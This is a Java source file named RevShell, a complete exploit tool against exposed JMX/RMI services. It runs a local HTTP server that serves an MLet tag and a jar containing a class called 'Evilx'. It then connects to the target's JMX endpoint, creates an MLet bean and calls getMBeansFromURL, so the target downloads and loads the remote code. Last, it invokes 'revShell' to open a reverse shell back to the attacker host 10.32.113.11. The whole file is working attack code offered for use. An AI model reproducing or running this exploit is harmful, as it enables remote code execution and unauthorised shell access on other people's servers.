import javax.management.remote.*;
import javax.management.*;
import java.util.*;
import java.lang.*;
import java.io.*;
import java.net.*;
import com.sun.net.httpserver.*;

public class RevShell {

    private static String HOSTNAME = "10.32.113.11";
    private static String JARNAME = "revShell.jar";
    private static String OBJECTNAME = "MLetRevShell:name=revShell,id=1337";
    private static String EVILCLASS = "Evilx";
    private static Integer localHTTPPort;

//    static {
//        try {
//            HOSTNAME = InetAddress.getLocalHost().getHostAddress();
//       } catch (Exception e){
//            e.printStackTrace();
//        }

//    }

    public static void main(String[] args) throws Throwable {
        try {
            localHTTPPort = Integer.valueOf(args[3]);

            // Create web server used to respond to JMX requests
            HttpServer server = HttpServer.create(new InetSocketAddress(localHTTPPort), 0);
            server.createContext("/mlet", new MLetHandler());
            server.createContext("/" + JARNAME, new JarHandler());
            server.setExecutor(null); // creates a default executor
            server.start();

            connectAndOwn(args[0], args[1], args[2]);

            server.stop(0);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void connectAndOwn(String serverName, String port, String revShellPort) throws Throwable {
        try {
            Map<String, ?> env = null;
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
            System.out.println("URL: " + u + ", connecting");

            JMXConnector c = JMXConnectorFactory.connect(u, env);

            System.out.println("Connected: " + c.getConnectionId());

            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance revShellBean = null;
            try {
                revShellBean = m.getObjectInstance(new ObjectName(OBJECTNAME));
                System.out.println("retrieved saved instance of " + OBJECTNAME);
            } catch (Exception e) {
                // Retrieval of OBJECTNAME failed, try to create it from scratch
                System.out.println("Trying to create bean...");
                ObjectInstance mletBean = null;
                try {
                    mletBean = m.createMBean("javax.management.loading.MLet", null);
                } catch (javax.management.InstanceAlreadyExistsException iaee) {
                    mletBean = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }
                // Obtained reference to MLet object
                System.out.println("Loaded " + mletBean.getClassName());

                String mletAddress = String.format("http://%s:%d/mlet", HOSTNAME, localHTTPPort);
                System.out.println("Address: " + mletAddress);

                ObjectName objectName = mletBean.getObjectName();
                System.out.println("ObjectName: " + objectName);
                Object res = m.invoke(objectName, "getMBeansFromURL", new Object[] { mletAddress },
                        new String[] { String.class.getName() });
                Iterator itr = ((HashSet) res).iterator();
                Object nextObject = itr.next();
                if (nextObject instanceof Throwable) {
                    // Something went wrong, bomb out
                    throw ((Throwable) nextObject);
                }
                revShellBean = ((ObjectInstance) nextObject);
            }
            System.out.println(
                    "Loaded class: " + revShellBean.getClassName() + " object " + revShellBean.getObjectName());
            System.out.println("Calling revShell with: " + revShellPort);
            Object result = m.invoke(revShellBean.getObjectName(), "revShell",
                    new Object[] { HOSTNAME + ":" + revShellPort }, new String[] { String.class.getName() });
            System.out.println("Result: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // HTTP handler to provide MLet source
    static class MLetHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            // Dynamically build MLet tag
            String response = String.format("<MLET CODE=%s ARCHIVE=%s NAME=%s CODEBASE=http://%s:%d></MLET>", EVILCLASS,
                    JARNAME, OBJECTNAME, HOSTNAME, localHTTPPort);
            System.out.println("Sending mlet: " + response + "\n");
            t.sendResponseHeaders(200, response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }
    }

    // HTTP handler to provide JAR
    static class JarHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            System.out.println("Request made for JAR...");
            File file = new File(JARNAME);
            byte[] bytearray = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            bis.read(bytearray, 0, bytearray.length);
            // ok, we are ready to send the response.
            t.sendResponseHeaders(200, file.length());
            bis.close();
            OutputStream os = t.getResponseBody();
            os.write(bytearray, 0, bytearray.length);
            os.close();
        }
    }
}
